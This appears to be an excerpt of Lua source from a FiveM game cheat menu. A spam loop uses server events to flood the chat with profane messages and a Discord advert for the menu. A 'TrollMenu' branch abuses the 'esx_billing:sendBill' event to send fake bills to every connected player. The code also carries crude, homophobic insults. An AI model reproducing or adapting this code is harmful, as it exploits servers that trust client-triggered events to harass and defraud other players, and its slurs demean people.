        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'foriv#0002',
                    {0, 0x99, 255},
                    '/ooc fuckforiv Buy at little dick menu'
                )
                TriggerServerEvent('_chat:messageEntered', 'forivthebitch', {0, 0x99, 255}, 'littledickmenu <3 https://discord.gg/hkZgrv3')
            end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "fuck forvi")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~littlebitch ~s~GENG")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "forvi gay Menu gay menu", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "gay menu", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "forvi gay Menu gay menu", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "forvi gay Menu gay menu", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "forvi gay Menu gay menu", "6969696969")
                end
